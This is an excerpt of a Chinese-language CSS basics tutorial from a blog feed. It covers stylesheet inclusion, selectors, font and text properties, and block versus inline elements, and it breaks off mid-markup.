    <content type="html"><![CDATA[<h1 id="CSS-基础"><a href="#CSS-基础" class="headerlink" title="CSS 基础"></a>CSS 基础</h1><blockquote><p>Cascading Style Sheets 通常称CSS样式表，以HTML为基础，提供了丰富的功能，如字体、样式、背景的控制及整体排版等，而且可以针对不同的浏览器设置不同的样式。</p></blockquote><h2 id="CSS基本使用"><a href="#CSS基本使用" class="headerlink" title="CSS基本使用"></a>CSS基本使用</h2><h3 id="CSS-规则"><a href="#CSS-规则" class="headerlink" title="CSS 规则"></a>CSS 规则</h3><ul><li><code>选择器 &#123;属性: 值;[其他属性和值]&#125;</code></li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">h1</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-style</span>: italic;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="CSS-注释"><a href="#CSS-注释" class="headerlink" title="CSS 注释"></a>CSS 注释</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 这是CSS注释 */</span><br></code></pre></td></tr></table></figure><h2 id="CSS-引入"><a href="#CSS-引入" class="headerlink" title="CSS 引入"></a>CSS 引入</h2><h3 id="1-行内样式（内联样式）"><a href="#1-行内样式（内联样式）" class="headerlink" title="1. 行内样式（内联样式）"></a>1. 行内样式（内联样式）</h3><p>通过标签的<code>style</code> 属性来设置元素的样式；缺点是只能控制当前标签以及嵌套在其中的字标签，没有实现样式和结构分离</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">h1</span> <span class="hljs-attr">style</span>=<span class="hljs-string">&quot;属性1:值1; 属性2:值2; 属性3:值3;&quot;</span>&gt;</span>标签内容<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="2-内嵌样式"><a href="#2-内嵌样式" class="headerlink" title="2.内嵌样式"></a>2.内嵌样式</h3><p>也称为内嵌式，将CSS代码集中写在HTML文档的<code>head</code> 标签中，并且用 <code>style</code> 标签定义；缺点是只能控制当前页面，没有彻底分离样式和结构</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">style</span>&gt;</span><span class="language-css"></span><br><span class="language-css">        选择器（选择标签） &#123;</span><br><span class="language-css">            属性<span class="hljs-number">1</span>:值<span class="hljs-number">1</span>; </span><br><span class="language-css">            属性<span class="hljs-number">2</span>:值<span class="hljs-number">2</span>; </span><br><span class="language-css">            属性<span class="hljs-number">3</span>:值<span class="hljs-number">3</span>;</span><br><span class="language-css">        &#125;</span><br><span class="language-css">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="3-外部样式（外链式）"><a href="#3-外部样式（外链式）" class="headerlink" title="3.外部样式（外链式）"></a>3.外部样式（外链式）</h3><p>将所有的样式放在一个或多个以 <code>.css</code> 为扩展名结尾的外部样式表文件中，通过 <code>link</code> 标签将外部样式表文件链接到HTML文档中</p><ul><li><code>rel</code> : 定义当前文档与被链接文档之间的关系，在这里需要指定为 <code>stylesheet</code> ，表示被链接的文档是一个样式表文件</li><li><code>href</code> : 定义所链接外部样式表文件的 URL，可以是相对路径也可以是绝对路径</li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">link</span>  <span class="hljs-attr">rel</span>=<span class="hljs-string">&quot;stylesheet&quot;</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;/css/main.css&quot;</span> /&gt;</span><br></code></pre></td></tr></table></figure><h2 id="CSS-基础选择器"><a href="#CSS-基础选择器" class="headerlink" title="CSS 基础选择器"></a>CSS 基础选择器</h2><h3 id="1-标签选择器"><a href="#1-标签选择器" class="headerlink" title="1. 标签选择器"></a>1. 标签选择器</h3><p>用HTML标签名作为选择器，按标签名称分类，为页面中某一类标签指定统一的CSS样式</p><ul><li>优点：快速为网页中同类型标签统一样式</li><li>缺点：不能设计差异化样式</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 语法 */</span><br>标签名 &#123;<br>    属性<span class="hljs-number">1</span>:值<span class="hljs-number">1</span>; <br>    属性<span class="hljs-number">2</span>:值<span class="hljs-number">2</span>; <br>    属性<span class="hljs-number">3</span>:值<span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-selector-tag">h1</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-style</span>: italic;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-类选择器"><a href="#2-类选择器" class="headerlink" title="2. 类选择器"></a>2. 类选择器</h3><p>使用 <code>.</code>  进行标识，后面紧跟我们自定义的类名，可以为元素对象定义单独或相同样式，可以选择一个或多个标签；这里需注意类名的命名：</p><ul><li>使用英文小写字母，长名称或词组中间使用短横线 <code>-</code> 拼接</li><li>多类名选择器各个类名用空格分割开</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 定义类名 */</span><br>&lt;<span class="hljs-selector-tag">p</span> class=&quot;类名<span class="hljs-selector-tag">A</span>&quot;&gt;&lt;/<span class="hljs-selector-tag">p</span>&gt;<br><span class="hljs-comment">/* 语法 */</span><br>.类名<span class="hljs-selector-tag">A</span> .类名<span class="hljs-selector-tag">B</span> &#123;<br>    属性<span class="hljs-number">1</span>:值<span class="hljs-number">1</span>; <br>    属性<span class="hljs-number">2</span>:值<span class="hljs-number">2</span>; <br>    属性<span class="hljs-number">3</span>:值<span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-selector-class">.myclass-head</span> <span class="hljs-selector-class">.myclass-foot</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-style</span>: italic;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-id-选择器"><a href="#3-id-选择器" class="headerlink" title="3. id 选择器"></a>3. id 选择器</h3><p>id选择器使用 <code>#</code> 进行标识，后面紧跟id名；元素的id值是唯一的，只能对应于文档中某一个具体的元素，应尽量减少使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 定义类名 */</span><br>&lt;<span class="hljs-selector-tag">p</span> id=&quot;id1&quot;&gt;&lt;/<span class="hljs-selector-tag">p</span>&gt;<br><span class="hljs-comment">/* 语法 */</span><br><span class="hljs-selector-id">#id</span>名 &#123;<br>    属性<span class="hljs-number">1</span>:值<span class="hljs-number">1</span>; <br>    属性<span class="hljs-number">2</span>:值<span class="hljs-number">2</span>; <br>    属性<span class="hljs-number">3</span>:值<span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-selector-id">#id1</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-style</span>: italic;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-通配符选择器"><a href="#4-通配符选择器" class="headerlink" title="4. 通配符选择器"></a>4. 通配符选择器</h3><p>通配符选择器用 <code>*</code> 进行标识，意为选择所有标签，能够匹配页面的所有元素，会降低页面响应速度，不建议随便使用</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 语法及示例 */</span><br>* &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-style</span>: italic;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-基础选择器总结"><a href="#5-基础选择器总结" class="headerlink" title="5. 基础选择器总结"></a>5. 基础选择器总结</h3><table><thead><tr><th align="left">选择器</th><th align="left">作用</th><th align="left">缺点</th><th align="left">使用情况</th><th align="left">用法</th></tr></thead><tbody><tr><td align="left">标签选择器</td><td align="left">可以选出所有相同的标签，比如p</td><td align="left">不能差异化选择</td><td align="left">较多</td><td align="left"><code>p &#123; color：red;&#125;</code></td></tr><tr><td align="left">类选择器</td><td align="left">可以选出1个或者多个标签</td><td align="left">可以根据需求选择</td><td align="left">非常多</td><td align="left"><code>.nav &#123; color: red; &#125;</code></td></tr><tr><td align="left">id选择器</td><td align="left">一次只能选择器1个标签</td><td align="left">只能使用一次</td><td align="left">不推荐使用</td><td align="left"><code>#nav &#123;color: red;&#125;</code></td></tr><tr><td align="left">通配符选择器</td><td align="left">选择所有的标签</td><td align="left">选择的太多，有部分不需要</td><td align="left">不推荐使用</td><td align="left"><code>* &#123;color: red;&#125;</code></td></tr></tbody></table><h2 id="CSS-复合选择器"><a href="#CSS-复合选择器" class="headerlink" title="CSS 复合选择器"></a>CSS 复合选择器</h2><h3 id="1-后代选择器"><a href="#1-后代选择器" class="headerlink" title="1. 后代选择器"></a>1. 后代选择器</h3><p>又称包含选择器，用来选择元素或元素组的子孙后代，其写法就是把外层标签写在前面，内层标签写在后面，中间用空格分割，当标签发生嵌套时，内层标签就成为外层标签的后代</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 定义类名 */</span><br>&lt;<span class="hljs-selector-tag">p</span> class=&quot;parent&quot;&gt;&lt;<span class="hljs-selector-tag">h1</span>&gt;hello&lt;/<span class="hljs-selector-tag">h1</span>&gt;&lt;/<span class="hljs-selector-tag">p</span>&gt;<br><span class="hljs-comment">/* 语法 */</span><br>父级类选择器 子级标签选择器 &#123;<br>    属性<span class="hljs-number">1</span>:值<span class="hljs-number">1</span>; <br>    属性<span class="hljs-number">2</span>:值<span class="hljs-number">2</span>; <br>    属性<span class="hljs-number">3</span>:值<span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-selector-class">.parent</span> <span class="hljs-selector-tag">h1</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-style</span>: italic;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-子元素选择器"><a href="#2-子元素选择器" class="headerlink" title="2. 子元素选择器"></a>2. 子元素选择器</h3><p>子元素选择器只能选择作为某元素子元素的元素，且只包含儿子，不包含孙子之类，其写法就是把父级标签写在前面，子级标签写在后面，中间跟一个<code>&gt;</code> 进行连接</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 定义类名 */</span><br>&lt;<span class="hljs-selector-tag">p</span> class=&quot;parent&quot;&gt;&lt;<span class="hljs-selector-tag">h1</span>&gt;hello&lt;/<span class="hljs-selector-tag">h1</span>&gt;&lt;/<span class="hljs-selector-tag">p</span>&gt;<br><span class="hljs-comment">/* 语法 */</span><br>父级类选择器 子级标签选择器&#123;<br>    属性<span class="hljs-number">1</span>:值<span class="hljs-number">1</span>; <br>    属性<span class="hljs-number">2</span>:值<span class="hljs-number">2</span>; <br>    属性<span class="hljs-number">3</span>:值<span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-selector-class">.parent</span>&gt;<span class="hljs-selector-tag">h1</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-style</span>: italic;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="3-交集选择器"><a href="#3-交集选择器" class="headerlink" title="3. 交集选择器"></a>3. 交集选择器</h3><p>选择既符合类又符合标签的元素，中间通过 <code>.</code> 连接，且不能有空格</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 定义类名 */</span><br>&lt;<span class="hljs-selector-tag">p</span> class=&quot;one&quot;&gt;hello&lt;/<span class="hljs-selector-tag">p</span>&gt;<br><span class="hljs-comment">/* 语法 */</span><br>标签选择器 类选择器&#123;<br>    属性<span class="hljs-number">1</span>:值<span class="hljs-number">1</span>; <br>    属性<span class="hljs-number">2</span>:值<span class="hljs-number">2</span>; <br>    属性<span class="hljs-number">3</span>:值<span class="hljs-number">3</span>;<br>&#125;<br><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-selector-tag">p</span><span class="hljs-selector-class">.one</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-style</span>: italic;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-并集选择器"><a href="#4-并集选择器" class="headerlink" title="4. 并集选择器"></a>4. 并集选择器</h3><p>如果某些选择器定义的相同样式，可通过 <code>,</code> 连接，用于集体声明，任何选择器都可以作为并集选择器的一部分</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 示例 */</span><br><span class="hljs-selector-class">.parent</span>, <span class="hljs-selector-tag">p</span>, <span class="hljs-selector-id">#id1</span> &#123;<br>    <span class="hljs-attribute">color</span>: red;<br>    <span class="hljs-attribute">font-style</span>: italic;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="5-链接伪类选择器"><a href="#5-链接伪类选择器" class="headerlink" title="5. 链接伪类选择器"></a>5. 链接伪类选择器</h3><p>用于向某些选择器添加特殊的效果，写的时候尽量按照<code>l-v-h-a</code> 的顺序，否则可能引起错位</p><ul><li><code>a : link</code> ：未访问的链接</li><li><code>a : visited</code> ：已访问的链接</li><li><code>a : hover</code> ：鼠标悬浮于链接上</li><li><code>a : active</code> ：点击链接</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">color</span>: blue;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="6-复合选择器总结"><a href="#6-复合选择器总结" class="headerlink" title="6. 复合选择器总结"></a>6. 复合选择器总结</h3><table><thead><tr><th align="left">选择器</th><th align="left">作用</th><th align="left">特征</th><th align="left">使用情况</th><th align="left">隔开符号及用法</th></tr></thead><tbody><tr><td align="left">后代选择器</td><td align="left">用来选择元素后代</td><td align="left">是选择所有的子孙后代</td><td align="left">较多</td><td align="left">符号是空格 <code>.nav a</code></td></tr><tr><td align="left">子代选择器</td><td align="left">选择 最近一级元素</td><td align="left">只选亲儿子</td><td align="left">较少</td><td align="left">符号是&gt; <code>.nav&gt;p</code></td></tr><tr><td align="left">交集选择器</td><td align="left">选择两个标签交集的部分</td><td align="left">既是 又是</td><td align="left">较少</td><td align="left">没有符号 <code>p.one</code></td></tr><tr><td align="left">并集选择器</td><td align="left">选择某些相同样式的选择器</td><td align="left">可以用于集体声明</td><td align="left">较多</td><td align="left">符号是逗号 <code>.nav, .header</code></td></tr><tr><td align="left">链接伪类选择器</td><td align="left">给链接更改状态</td><td align="left"></td><td align="left">较多</td><td align="left">重点记住 a{} 和 <code>a:hover</code>实际开发的写法</td></tr></tbody></table><h2 id="字体样式"><a href="#字体样式" class="headerlink" title="字体样式"></a>字体样式</h2><h3 id="1-font-size"><a href="#1-font-size" class="headerlink" title="1. font-size"></a>1. font-size</h3><ul><li><code>font-size</code> ：用于设置字体字号</li><li>主流五大浏览器默认文字大小为 <code>16px</code> ，一般给 body 指定整个页面的文字大小</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;&#125;<br></code></pre></td></tr></table></figure><h4 id="单位"><a href="#单位" class="headerlink" title="单位"></a>单位</h4><table><thead><tr><th>相对长度单位</th><th>说明</th></tr></thead><tbody><tr><td>em</td><td>相对于当前对象文本的字体尺寸</td></tr><tr><td>px</td><td>像素，最常用，推荐</td></tr><tr><td><strong>绝对长度单位</strong></td><td><strong>说明</strong></td></tr><tr><td>in</td><td>英寸</td></tr><tr><td>cm</td><td>厘米</td></tr><tr><td>mm</td><td>毫米</td></tr><tr><td>pt</td><td>点</td></tr></tbody></table><h3 id="2-font-family"><a href="#2-font-family" class="headerlink" title="2. font-family"></a>2. font-family</h3><ul><li><code>font-family</code> ：用于设置字体种类</li><li>指定多个字体，若浏览器不支持第一个就会尝试下一个；如果都没有，以电脑默认字体为准</li><li>虽然 css 支持中文字体名称，但在老系统xp中是不支持类似微软雅黑的中文的，所以推荐使用英文字体名称，或使用unicode</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-family</span>: Arial,<span class="hljs-string">&quot;Microsoft Yahei&quot;</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="3-font-weight"><a href="#3-font-weight" class="headerlink" title="3. font-weight"></a>3. font-weight</h3><ul><li><code>font-weight</code> ：用于设置字体粗细</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-weight</span>: bold;&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>属性值</th><th>描述</th></tr></thead><tbody><tr><td>normal</td><td>默认值</td></tr><tr><td>bold</td><td>加粗</td></tr><tr><td>100~900</td><td>400 等同于 normal ，而700等同于 bold</td></tr></tbody></table><h3 id="4-font-style"><a href="#4-font-style" class="headerlink" title="4. font-style"></a>4. font-style</h3><ul><li><code>font-style</code> ：用于定义字体风格，是否斜体</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font-style</span>: italic;&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th>属性值</th><th>作用</th></tr></thead><tbody><tr><td>normal</td><td>默认值，浏览器显示标准字体样式</td></tr><tr><td>italic</td><td>斜体</td></tr></tbody></table><h3 id="5-font"><a href="#5-font" class="headerlink" title="5. font"></a>5. font</h3><ul><li><code>font</code> ：用于综合设置字体样式</li><li>必须按照以下顺序书写 ，不能更改顺序，各个属性以空格隔开，不需要的属性可以忽略，但必须保留 <code>font-size</code> 和 <code>font-family</code> 的值，否则该属性不生效</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">选择器 &#123;<span class="hljs-attribute">font</span>: font-style font-weight font-size font-family;&#125;<br><span class="hljs-comment">/* 实例 */</span><br><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">font</span>: italic bold <span class="hljs-number">11px</span> Arial&#125;<br></code></pre></td></tr></table></figure><h3 id="6-font-总结"><a href="#6-font-总结" class="headerlink" title="6. font 总结"></a>6. font 总结</h3><table><thead><tr><th align="left">属性</th><th align="left">表示</th><th align="left">注意点</th></tr></thead><tbody><tr><td align="left">font-size</td><td align="left">字号</td><td align="left">我们通常用的单位是px 像素，一定要跟上单位</td></tr><tr><td align="left">font-family</td><td align="left">字体</td><td align="left">实际工作中按照团队约定来写字体</td></tr><tr><td align="left">font-weight</td><td align="left">字体粗细</td><td align="left">记住加粗是 700 或者 bold 不加粗 是 normal 或者 400 记住数字不要跟单位</td></tr><tr><td align="left">font-style</td><td align="left">字体样式</td><td align="left">记住倾斜是 italic 不倾斜 是 normal 工作中我们最常用 normal</td></tr><tr><td align="left">font</td><td align="left">字体连写</td><td align="left">1. 字体连写是有顺序的 不能随意换位置 2. 其中字号 和 字体 必须同时出现</td></tr></tbody></table><h2 id="CSS-外观属性"><a href="#CSS-外观属性" class="headerlink" title="CSS 外观属性"></a>CSS 外观属性</h2><h3 id="1-color"><a href="#1-color" class="headerlink" title="1. color"></a>1. color</h3><ul><li><code>color</code> ：用于定义文本颜色</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">color</span>: <span class="hljs-number">#FF0000</span>;&#125;<br></code></pre></td></tr></table></figure><p>取值方式有三种， 实际工作中用 16进制 的写法是最多的，且我们更喜欢简写方式比如 #f0 代表红色 </p><table><thead><tr><th align="left">表示</th><th align="left">属性值</th></tr></thead><tbody><tr><td align="left">预定义的颜色值</td><td align="left">red，green，blue，pink</td></tr><tr><td align="left">十六进制</td><td align="left">#FF0000，#FF6600，#29D794</td></tr><tr><td align="left">RGB代码</td><td align="left">rgb(255,0,0)或rgb(100%,0%,0%)</td></tr></tbody></table><h3 id="2-text-align"><a href="#2-text-align" class="headerlink" title="2. text-align"></a>2. text-align</h3><ul><li><code>text-align</code> ：用于设置 文本内容 的水平对齐方式，相当于html中的align属性</li><li>注意是让盒子里面的文本内容水平居中 ，而不是让盒子居中对齐</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">text-align</span>: center;&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">属性</th><th align="left">解释</th></tr></thead><tbody><tr><td align="left">left</td><td align="left">左对齐（默认值）</td></tr><tr><td align="left">right</td><td align="left">右对齐</td></tr><tr><td align="left">center</td><td align="left">居中对齐</td></tr></tbody></table><h3 id="3-line-height"><a href="#3-line-height" class="headerlink" title="3. line-height"></a>3. line-height</h3><ul><li><code>line-height</code> ：用于设置行间距，即字符之间的垂直距离，一般称为行高</li><li>常用的属性值单位有三种，分别为 <code>像素px</code> ，<code>相对值em</code> 和 <code>百分比%</code> ，实际工作中使用最多的是像素px</li></ul><h4 id="行高"><a href="#行高" class="headerlink" title="行高"></a>行高</h4><p><img src="/../blog-assets/HTML+CSS/1655864866607.png" alt="1655864866607"></p><ul><li>行高：指相邻文本行<code>基线</code> 之间的距离，基线并不是指汉字的下端沿，而是指英文字母 <code>x</code> 的下端沿。</li></ul><p>行高我们利用最多的一个地方：让单行文本在盒子中 <code>垂直居中</code>  对齐</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-comment">/* 一般行间距比字号大7-8像素左右就可以了 */</span><br><span class="hljs-comment">/* line-height 要设置在 font 属性下，否则无效 */</span><br><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">height</span>: <span class="hljs-number">40px</span>;<br>    <span class="hljs-attribute">text-align</span>: center<br>    font: normal bold <span class="hljs-number">30px</span> <span class="hljs-string">&quot;宋体&quot;</span>;<br>    <span class="hljs-attribute">line-height</span>: <span class="hljs-number">40px</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>行高与高度的关系</p><ul><li>行高 <code>line-height</code> &#x3D; 高度 <code>height</code> ，文字垂直居中</li><li>行高 &gt;  高度，文字偏下</li><li>行高 &lt;  高度，文字偏上</li></ul><p>也可以使用以下方式让文字水平垂直居中</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<br>    <span class="hljs-attribute">display</span>: flex;<br>    <span class="hljs-attribute">align-items</span>: center; <span class="hljs-comment">/* 侧轴对齐方式 */</span><br>    <span class="hljs-attribute">justify-content</span>: center; <span class="hljs-comment">/* 主轴对齐方式 */</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="4-text-indent"><a href="#4-text-indent" class="headerlink" title="4. text-indent"></a>4. text-indent</h3><ul><li><code>text-indent</code> ：用于设置首行文本的缩进</li><li>常用的属性值有 字符宽度<code>em</code> 和 相对于浏览器窗口的百分比 <code>%</code> ，建议使用 <code>em</code> ，1em 就是一个汉字的宽度</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">text-indent</span>: <span class="hljs-number">1em</span>;&#125;<br></code></pre></td></tr></table></figure><h3 id="5-text-decoration"><a href="#5-text-decoration" class="headerlink" title="5. text-decoration"></a>5. text-decoration</h3><ul><li><code>text-decoration</code> ：用于给链接修改装饰效果</li></ul><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css"><span class="hljs-selector-tag">p</span> &#123;<span class="hljs-attribute">text-decoration</span>: underline;&#125;<br></code></pre></td></tr></table></figure><table><thead><tr><th align="left">值</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left">none</td><td align="left">默认。定义标准的文本。取消下划线（最常用）</td></tr><tr><td align="left">underline</td><td align="left">定义文本下的一条线。下划线 也是我们链接自带的（常用）</td></tr><tr><td align="left">overline</td><td align="left">定义文本上的一条线。（不用）</td></tr><tr><td align="left">line-through</td><td align="left">定义穿过文本下的一条线。（不常用）</td></tr></tbody></table><h3 id="6-外观属性总结"><a href="#6-外观属性总结" class="headerlink" title="6. 外观属性总结"></a>6. 外观属性总结</h3><table><thead><tr><th align="left">属性</th><th align="left">表示</th><th align="left">注意点</th></tr></thead><tbody><tr><td align="left">color</td><td align="left">颜色</td><td align="left">我们通常用 十六进制 比如 而且是简写形式 #fff</td></tr><tr><td align="left">line-height</td><td align="left">行高</td><td align="left">控制行与行之间的距离</td></tr><tr><td align="left">text-align</td><td align="left">水平对齐</td><td align="left">可以设定文字水平的对齐方式</td></tr><tr><td align="left">text-indent</td><td align="left">首行缩进</td><td align="left">通常我们用于段落首行缩进2个字的距离 text-indent: 2em;</td></tr><tr><td align="left">text-decoration</td><td align="left">文本修饰</td><td align="left">记住 添加 下划线 underline 取消下划线 none</td></tr></tbody></table><h2 id="标签显示模式"><a href="#标签显示模式" class="headerlink" title="标签显示模式"></a>标签显示模式</h2><p>标签以什么方式进行显示，HTML标签一般分为 <code>块标签</code> 和 <code>行内标签</code> 两种类型，它们也称 <code>块元素</code> 和 <code>行内元素</code> 。</p><h3 id="1-块元素（block-level）"><a href="#1-块元素（block-level）" class="headerlink" title="1. 块元素（block-level）"></a>1. 块元素（block-level）</h3><h4 id="常见块元素"><a href="#常见块元素" class="headerlink" title="常见块元素"></a>常见块元素</h4><p> <code>&lt;h1&gt;~&lt;h6&gt;</code> ，<code>&lt;p&gt;</code>， <code>&lt;div&gt;</code>， <code>&lt;ul&gt;</code>， <code>&lt;ol&gt;</code>， <code>&lt;li&gt;</code> 等，其中 <code>&lt;div&gt;</code> 标签是最典型的块元素</p><h4 id="块元素特点"><a href="#块元素特点" class="headerlink" 